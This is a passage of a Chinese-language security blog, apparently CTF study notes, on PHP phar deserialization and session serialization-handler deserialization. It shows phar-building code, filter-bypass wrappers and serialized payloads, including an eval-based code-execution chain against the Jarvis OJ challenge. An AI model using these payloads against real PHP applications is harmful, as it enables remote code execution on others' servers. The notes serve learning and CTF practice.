title="创建一个phar文件"></a>创建一个phar文件</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">AnyClass</span> </span>&#123;&#125;<br><span class="hljs-variable">$object</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">AnyClass</span>();<br><br><span class="hljs-comment">// unlink():PHP中用来删除一个文件</span><br><span class="hljs-comment">// create new Phar</span><br><span class="hljs-variable">$phar</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Phar</span>(<span class="hljs-string">&#x27;phar.phar&#x27;</span>);<span class="hljs-comment">// 使用Phar()创建phar文件后缀必须是phar</span><br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">startBuffering</span>();<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">addFromString</span>(<span class="hljs-string">&#x27;test.txt&#x27;</span>, <span class="hljs-string">&#x27;text&#x27;</span>);<span class="hljs-comment">// 添加要压缩的文件</span><br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setStub</span>(<span class="hljs-string">&#x27;&lt;?php __HALT_COMPILER(); ?&gt;&#x27;</span>);<span class="hljs-comment">// 设置stub</span><br><span class="hljs-comment">// 设置stub，GIF89a可以改成其他的字段，绕过文件头检验，但必须以 __HALT_COMPILER(); ?\&gt; 结尾 </span><br><span class="hljs-comment">//$phar-&gt;setStub(&quot;GIF89a&quot;.&quot;&lt;?php __HALT_COMPILER(); ?\&gt;&quot;);</span><br><br><span class="hljs-comment">// add object of any class as meta data </span><br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setMetadata</span>(<span class="hljs-variable">$object</span>);<span class="hljs-comment">// 即将自定义的meta-data存入manifest</span><br><br><span class="hljs-comment">// 这里会自动计算签名</span><br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">stopBuffering</span>();<br><span class="hljs-string">&#x27;&#x27;</span><span class="hljs-string">&#x27;</span><br><span class="hljs-string">xxd phar.phar</span><br><span class="hljs-string">00000000: 3c3f 7068 7020 5f5f 4841 4c54 5f43 4f4d  &lt;?php __HALT_COM</span><br><span class="hljs-string">00000010: 5049 4c45 5228 293b 203f 3e0d 0a49 0000  PILER(); ?&gt;..I..</span><br><span class="hljs-string">00000020: 0001 0000 0011 0000 0001 0000 0000 0013  ................</span><br><span class="hljs-string">00000030: 0000 004f 3a38 3a22 416e 7943 6c61 7373  ...O:8:&quot;AnyClass</span><br><span class="hljs-string">00000040: 223a 303a 7b7d 0800 0000 7465 7374 2e74  &quot;:0:&#123;&#125;....test.t</span><br><span class="hljs-string">00000050: 7874 0400 0000 d1a0 0069 0400 0000 c7a7  xt.......i......</span><br><span class="hljs-string">00000060: 8b3b b601 0000 0000 0000 7465 7874 3317  .;........text3.</span><br><span class="hljs-string">00000070: dbbe 1a77 247c 7570 0a9f 7d60 0b2b 790e  ...w$|up..&#125;`.+y.</span><br><span class="hljs-string">00000080: 5738 0f7d c824 7eaf 2c6c d7ad f9ec 0300  W8.&#125;.$~.,l......</span><br><span class="hljs-string">00000090: 0000 4742 4d42                           ..GBMB</span><br><span class="hljs-string">&#x27;</span><span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-comment">// 可以发现其中有反序列化的部分 O:8:&quot;AnyClass&quot;:0:&#123;&#125;，即meta-data是以序列化的形式存储的</span><br><br><span class="hljs-comment">// 进行测试：</span><br><span class="hljs-meta">&lt;?php</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">AnyClass</span> </span>&#123; <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123; <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Destruct called&#x27;</span>; &#125; &#125; <span class="hljs-variable">$filename</span> = <span class="hljs-string">&#x27;phar://phar.phar/test.txt&#x27;</span>; <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$filename</span>); <span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">//                            这里是一个解压的过程</span><br><span class="hljs-comment">// 浏览器可以出来，但是IDE不行，应该是没有根目录设置什么的导致的文件索引有问题</span><br><span class="hljs-comment">//// Web服务器的&quot;当前工作目录&quot;是脚本所在的目录，而IDE的可能是项目的根目录，emm貌似都放在项目根目录也不行</span><br></code></pre></td></tr></table></figure><h4 id="phar伪协议对后缀的不在意"><a href="#phar伪协议对后缀的不在意" class="headerlink" title="phar伪协议对后缀的不在意"></a>phar伪协议对后缀的不在意</h4><ul><li>由于phar是一个打包文件，所有只需要<code>phar://</code>检测到的文件是一个正常的打包文件的话就可以了，它并不会去检测文件名和文件内容</li><li>参考博客说压缩要设置<em>仅存储</em>，但根据测试这个并不需要</li><li>所有我们可以将一个内容为<code>&lt;?php phpinfo();?&gt;</code>的<code>test.php</code>压成<code>test.zip</code>，再改后缀成<code>test.jpg</code>，然后用<code>phar://test.jpg/test.php</code>访问</li><li>这利用的是<code>phar</code>协议解析文件的特性</li></ul><h5 id="php解析机制的不同"><a href="#php解析机制的不同" class="headerlink" title="php解析机制的不同"></a>php解析机制的不同</h5><ul><li>不同于<code>phar://</code>的解析机制，php需要通过其文件头的<code>stub</code>，即<code>__HALT_COMPILER();</code>来识别其是<code>phar</code>文件</li><li>不过php的解析也是不在意后缀的</li></ul><p>例题：<a href="https://www.jianshu.com/p/19e3ee990cb7">[hitcon2017] Baby^H-master-php-2017 复现</a><br>PS:匿名函数的真正名字为:%00lambda_%d(%d格式化为当前进程的第n个匿名函数)</p><h4 id="禁止phar开头"><a href="#禁止phar开头" class="headerlink" title="禁止phar开头"></a>禁止phar开头</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">compress.zlib://phar://phar.phar/test.txt<br>compress.bzip://phar:///test.phar/test.txt<br>compress.bzip2://phar://phar.phar/test.txt<br>php://filter/resource=phar:///test.phar/test.txt<br>php://filter/read=convert.base64-encode/resource=phar://phar.phar/test.txt<br><br></code></pre></td></tr></table></figure><h5 id="HALT-COMPILER特征检测"><a href="#HALT-COMPILER特征检测" class="headerlink" title="__HALT_COMPILER特征检测"></a>__HALT_COMPILER特征检测</h5><ul><li>可以用<code>gzip</code>压缩来消除敏感字符：<code>xxx.phar-&gt;xxx.phar.gz-&gt;xxx.png</code></li><li><code>tar/bzip2</code> 压缩也行<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">gzip xxx.phar<br><br>phar://xxx.phar.gz/xxx.phar<br>phar://xxx.png/xxx.phar<br>              <span class="hljs-comment"># 此处进行解压</span><br></code></pre></td></tr></table></figure></li><li>也可以通过将phar内容写进压缩包注释中，然后压缩为zip</li><li>不过由于zip注释无法写入<code>%00</code>,如果有<code>protected</code>或者<code>private</code>需要将序列化数据s改成S,然后后面通过16进制写入进行绕过<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$phar_file</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$exp</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$phar_file</span>;<br><span class="hljs-variable">$zip</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ZipArchive</span>();<br><span class="hljs-variable">$res</span> = <span class="hljs-variable">$zip</span>-&gt;<span class="hljs-title function_ invoke__">open</span>(<span class="hljs-string">&#x27;1.zip&#x27;</span>,<span class="hljs-title class_">ZipArchive</span>::<span class="hljs-variable constant_">CREATE</span>);<br><span class="hljs-variable">$zip</span>-&gt;<span class="hljs-title function_ invoke__">addFromString</span>(<span class="hljs-string">&#x27;crispr.txt&#x27;</span>, <span class="hljs-string">&#x27;file content goes here&#x27;</span>);<br><span class="hljs-variable">$zip</span>-&gt;<span class="hljs-title function_ invoke__">setArchiveComment</span>(<span class="hljs-variable">$phar_file</span>);<br><span class="hljs-variable">$zip</span>-&gt;<span class="hljs-title function_ invoke__">close</span>();<br></code></pre></td></tr></table></figure></li></ul><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://www.php.net/manual/zh/book.phar.php">PHP: Phar - Manual</a><br><a href="https://www.freebuf.com/articles/web/291992.html">php phar反序列化总结 - FreeBuf网络安全行业门户</a></p><p><a href="https://www.cnblogs.com/sijidou/p/13121358.html">利用phar协议造成php反序列化 - sijidou - 博客园</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>反序列化</tag>
      
      <tag>phar</tag>
      
      <tag>文件包含</tag>
      
      <tag>伪协议</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>php的session机制深层解析与利用</title>
    <link href="/2025/10/18/php%E7%9A%84session%E6%9C%BA%E5%88%B6%E6%B7%B1%E5%B1%82%E8%A7%A3%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/"/>
    <url>/2025/10/18/php%E7%9A%84session%E6%9C%BA%E5%88%B6%E6%B7%B1%E5%B1%82%E8%A7%A3%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<h3 id="示例解析"><a href="#示例解析" class="headerlink" title="示例解析"></a>示例解析</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">// ini_set(&#x27;display_errors&#x27;, 0);// 关闭错误显示</span><br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&#x27;session.serialize_handler&#x27;</span>, <span class="hljs-string">&#x27;php&#x27;</span>);<span class="hljs-comment">// 使用php序列化引擎</span><br><span class="hljs-comment">//ini_set(&#x27;session.serialize_handler&#x27;, &#x27;php_serialize&#x27;);// 使用php序列化引擎</span><br><span class="hljs-comment">//ini_set(&#x27;session.serialize_handler&#x27;, &#x27;php_binary&#x27;);// 使用php序列化引擎</span><br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&#x27;session.save_path&#x27;</span>, <span class="hljs-string">&#x27;./session&#x27;</span>);<br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&#x27;session.save_handler&#x27;</span>, <span class="hljs-string">&#x27;files&#x27;</span>);<br><span class="hljs-title function_ invoke__">date_default_timezone_set</span>(<span class="hljs-string">&quot;Asia/Shanghai&quot;</span>);<span class="hljs-comment">// 设置程序的默认时区为“亚洲/上海”时区</span><br><span class="hljs-comment">// 自 PHP5.1 起，如果使用任何日期或时间函数，有没有在 php.ini 或代码中指定时区，就会抛出一个 E_WARNING 级别的警告</span><br><span class="hljs-title function_ invoke__">session_start</span>();<br><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;yeah&quot;</span>;<br><br><span class="hljs-comment">// 设置 session 不需要像 cookie 一样需要一个set_cookie()</span><br><span class="hljs-comment">// session_start();后会进行下面操作</span><br><span class="hljs-comment">// 当浏览器发送的数据包里没有 PHPSESSID 时，浏览器会创建一个新的会话，并且准备好一个空的$_SESSION数组，然后通过响应包发送一个Set-Cookie: PHPSESSID让浏览器存储会话ID</span><br><br><span class="hljs-comment">// 重要：当访问是携带 PHPSESSID 时，PHP会用这个ID在服务器上寻找对应的会话文件，PHP会读取这个文件里的内容，然后反序列化（根据处理器），并用这些数据填充 $_SESSION 这个超全局数组</span><br><br><span class="hljs-comment">// 会话文件名默认为 sess_PHPSESSID</span><br><br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;limit&#x27;</span>]= <span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;limit&#x27;</span>]);<br><span class="hljs-comment">// $_COOKIE[&#x27;limit&#x27;] = MQ==</span><br></code></pre></td></tr></table></figure><ul><li>以我的理解和推测的话，从<code>$_SESSION</code>获取值的过程的第一步应该是先根据<strong>会话ID</strong>读取数据然后用<em><strong>相应的处理器反序列化</strong></em>得到结果，中间可能有调用<code>unserialize()</code></li><li><code>$_SESSION</code>存储值的过程的最后一步就是用<em><strong>相应处理器序列化</strong></em>后存储到文件里</li><li>每次读取<code>$_SESSION</code>都经过存储，也就是说都经过一次序列化和反序列化</li></ul><h4 id="序列化处理器"><a href="#序列化处理器" class="headerlink" title="序列化处理器"></a>序列化处理器</h4><h5 id="php"><a href="#php" class="headerlink" title="php"></a>php</h5><ul><li>存储：<code>SESSION键名|serialize($_SESSION[&#39;键名&#39;])</code><ul><li><code>limit|s:1:&quot;1&quot;;</code></li></ul></li></ul><h5 id="php-serialize"><a href="#php-serialize" class="headerlink" title="php_serialize"></a>php_serialize</h5><ul><li>存储：应该是<code>serialize()</code>直接序列化<code>$_SESSION[]</code>数组<ul><li><code>a:1:&#123;s:5:&quot;limit&quot;;s:1:&quot;1&quot;;&#125;</code></li></ul></li><li><strong>php大于5.5.4的版本中默认使用php_serialize规则</strong>，在此之前使用<em><strong>php</strong></em><ul><li>怎么感觉是php处理器漏洞太容易利用所以换了</li></ul></li></ul><h5 id="php-binary"><a href="#php-binary" class="headerlink" title="php_binary"></a>php_binary</h5><ul><li>存储：<code>键名的长度对应的ASCII字符＋键名＋经过serialize()序列化后并处理的值</code><ul><li><code>limits:1:&quot;1&quot;;</code></li></ul></li></ul><h3 id="什么是session反序列化"><a href="#什么是session反序列化" class="headerlink" title="什么是session反序列化"></a>什么是session反序列化</h3><ul><li>PHP在&#x3D;&#x3D;session&#x3D;&#x3D;存储和读取的时候，都会有一个序列化和反序列化的过程，在这个过程中就可能引发反序列化漏洞利用</li><li>&#x3D;&#x3D;php.ini&#x3D;&#x3D;中相关配置，以WampServer为例<ul><li><code>session.save_path</code>：设置session的存储路径</li><li><code>session.save_handler</code>：设定用户自定义存储函数，值为<code>files</code>表示以文件方式存储</li><li><code>session.auto_start</code>：指定会话模块是否在请求时启动一个会话，当值为<code>Off</code>的时候，如果两个脚本注册session会话时使用的序列化处理器不同，就会出现安全问题</li><li><code>session.serialize_handler</code>：定义用来序列化&#x2F;反序列化的<em><strong>处理器</strong></em>名字，默认php，处理默认的<em><strong>session序列化引擎</strong></em>php外，还有几种引擎，不同引擎存储方式不同<ul><li><strong>php_binary</strong>、<strong>php</strong>、<strong>php_serialize</strong></li></ul></li></ul></li></ul><h5 id="序列化处理器不同导致的反序列化漏洞"><a href="#序列化处理器不同导致的反序列化漏洞" class="headerlink" title="序列化处理器不同导致的反序列化漏洞"></a>序列化处理器不同导致的反序列化漏洞</h5><ul><li>其实也相当于<code>php</code>处理器的反序列化漏洞，处理器不同貌似也不影响<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs php">demo1.php<br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&#x27;session.serialize_handler&#x27;</span>, <span class="hljs-string">&#x27;php_serialize&#x27;</span>);<br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&#x27;session.save_path&#x27;</span>, <span class="hljs-string">&#x27;./session&#x27;</span>);<br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&#x27;session.save_handler&#x27;</span>, <span class="hljs-string">&#x27;files&#x27;</span>);<br><span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;username&#x27;</span>] = @<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;a href=&#x27;test3.php&#x27; &gt;gogogo&lt;/a&gt;&quot;</span>;<br><br>demo2.php<br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&#x27;session.serialize_handler&#x27;</span>, <span class="hljs-string">&#x27;php&#x27;</span>);<br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&#x27;session.save_path&#x27;</span>, <span class="hljs-string">&#x27;./session&#x27;</span>);<br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&#x27;session.save_handler&#x27;</span>, <span class="hljs-string">&#x27;files&#x27;</span>);<br><span class="hljs-title function_ invoke__">session_start</span>();<br><br>Class demo &#123;<br>    <span class="hljs-keyword">var</span> <span class="hljs-variable">$username</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;username = <span class="hljs-string">&#x27;guest&#x27;</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;username == <span class="hljs-string">&#x27;admin&#x27;</span>) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;yes&quot;</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;nonono!&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br>exp.php<br><span class="hljs-meta">&lt;?php</span><br>Class demo&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>=<span class="hljs-string">&#x27;admin&#x27;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$obj</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">demo</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;|&#x27;</span>.<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$obj</span>);<br><span class="hljs-comment">//|O:4:&quot;demo&quot;:1:&#123;s:8:&quot;username&quot;;s:5:&quot;admin&quot;;&#125;</span><br><span class="hljs-comment">// 存储：a:1:&#123;s:8:&quot;username&quot;;s:43:&quot;|O:4:&quot;demo&quot;:1:&#123;s:8:&quot;username&quot;;s:5:&quot;admin&quot;;&#125;&quot;;&#125;</span><br><span class="hljs-comment">// 如果是php存储：username|s:43:&quot;|O:4:&quot;demo&quot;:1:&#123;s:8:&quot;username&quot;;s:5:&quot;admin&quot;;&#125;&quot;;</span><br><span class="hljs-comment">//// 没有|：username|s:42:&quot;O:4:&quot;demo&quot;:1:&#123;s:8:&quot;username&quot;;s:5:&quot;admin&quot;;&#125;&quot;;，这就就不能触发发序列化</span><br><span class="hljs-comment">// 在使用php引擎解析的的时候，php会以a:1:&#123;s:8:&quot;username&quot;;s:43:&quot;为key，O:4:&quot;demo&quot;:1:&#123;s:8:&quot;username&quot;;s:5:&quot;admin&quot;;&#125;&quot;;&#125;为value，然后对value进行反序列化</span><br><br><span class="hljs-comment">// 需要注意的是会话ID要相同</span><br></code></pre></td></tr></table></figure></li></ul><h4 id="SESSION上传进度"><a href="#SESSION上传进度" class="headerlink" title="SESSION上传进度"></a>SESSION上传进度</h4><ul><li>当<code>session.upload_progress.enabled INI</code>选项开启时，PHP 能够在每一个文件上传时监测上传进度</li><li>这个信息对上传请求自身并没有什么帮助，但在文件上传时应用可以发送一个POST请求到终端（例如通过XHR）来检查这个状态</li><li>当一个上传在处理中，同时POST一个与&#x3D;&#x3D;INI&#x3D;&#x3D;中设置的<code>session.upload_progress.name</code>同名变量时，上传进度可以在<code>$_SESSION</code>中获得。 </li><li>当PHP检测到这种POST请求时，它会在<code>$_SESSION</code>中添加一组数据, 索引是<code>session.upload_progress.prefix</code>与<code> session.upload_progress.name</code>连接在一起的值</li><li>因此，可以通过POST方法来构造数据传入<code>$_SSEION</code><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs html">```<br><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;http://web.jarvisoj.com:32784/index.php&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;POST&quot;</span> <span class="hljs-attr">enctype</span>=<span class="hljs-string">&quot;multipart/form-data&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;123&quot;</span> /&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;file&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;file&quot;</span> /&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> /&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">#### 题目：Jarvisoj Web</span><br>- 默认为php_serialize而index.php中又使用了php，反序列化和序列化使用的处理器不同，由于格式的原因会导致数据无法正确反序列化，那么就可以通过构造伪造任意数据<br>- 源代码<br>```php<br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">//A webshell is wait for you</span><br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&#x27;session.serialize_handler&#x27;</span>, <span class="hljs-string">&#x27;php&#x27;</span>);<br><span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">OowoO</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$mdzz</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;mdzz = <span class="hljs-string">&#x27;phpinfo();&#x27;</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable language_">$this</span>-&gt;mdzz);<br>    &#125;<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;phpinfo&#x27;</span>]))<br>&#123;<br>    <span class="hljs-variable">$m</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">OowoO</span>();<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_string</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;sessiontest.php&#x27;</span>));<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure></li><li>构造字符串获得路径<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">OowoO</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$mdzz</span>=<span class="hljs-string">&#x27;print_r(dirname(__FILE__));&#x27;</span>;<br>&#125;<br><span class="hljs-variable">$obj</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">OowoO</span>();<br><span class="hljs-variable">$a</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$obj</span>);<br><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$a</span>);<br></code></pre></td></tr></table></figure></li><li>然后改为：<code>|O:5:\&quot;OowoO\&quot;:1:&#123;s:4:\&quot;mdzz\&quot;;s:27:\&quot;print_r(dirname(__FILE__));\&quot;;&#125;</code></li><li>没有调用创造函数的原因是此时使用php处理引擎</li><li>查文件：<code>|O:5:\&quot;OowoO\&quot;:1:&#123;s:4:\&quot;mdzz\&quot;;s:36:\&quot;print_r(scandir(dirname(__FILE__)));\&quot;;&#125;</code></li><li>分析借鉴：<ul><li><a href="https://blog.csdn.net/dyw_666666/article/details/89371741">Jarvis-OJ WEB 多题writeup-CSDN博客</a></li></ul></li></ul><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs lua">&lt;form action=<span class="hljs-string">&quot;upload.php&quot;</span> method=<span class="hljs-string">&quot;POST&quot;</span> enctype=<span class="hljs-string">&quot;multipart/form-data&quot;</span>&gt;<br>&lt;<span class="hljs-built_in">input</span> <span class="hljs-built_in">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> name=<span class="hljs-string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span> value=<span class="hljs-string">&quot;ryat&quot;</span> /&gt;<br>&lt;<span class="hljs-built_in">input</span> <span class="hljs-built_in">type</span>=<span class="hljs-string">&quot;file&quot;</span> name=<span class="hljs-string">&quot;file&quot;</span> /&gt;<br>&lt;<span class="hljs-built_in">input</span> <span class="hljs-built_in">type</span>=<span class="hljs-string">&quot;submit&quot;</span> /&gt;<br>&lt;/form&gt;<br></code></pre></td></tr></table></figure><p>The key of 